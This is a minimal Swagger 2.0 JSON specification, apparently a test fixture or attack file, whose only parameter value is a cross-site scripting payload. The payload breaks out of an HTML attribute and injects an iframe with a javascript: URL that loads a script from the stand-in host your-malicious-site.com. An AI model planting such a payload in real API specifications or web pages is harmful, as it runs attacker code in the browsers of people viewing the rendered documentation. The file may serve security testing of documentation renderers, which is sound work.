{
  "paths": {
    "/a": {
      "post": {
        "parameters": [
          {
            "X-data-swag": "whatever'><iframe src='javascript:(function(){var s=document.createElement(\"script\");s.src=\"https://your-malicious-site.com/malware.js\";document.body.appendChild(s);})();'></iframe>'"
          }
        ]
      }
    }
  },
  "swagger": "2.0"
}
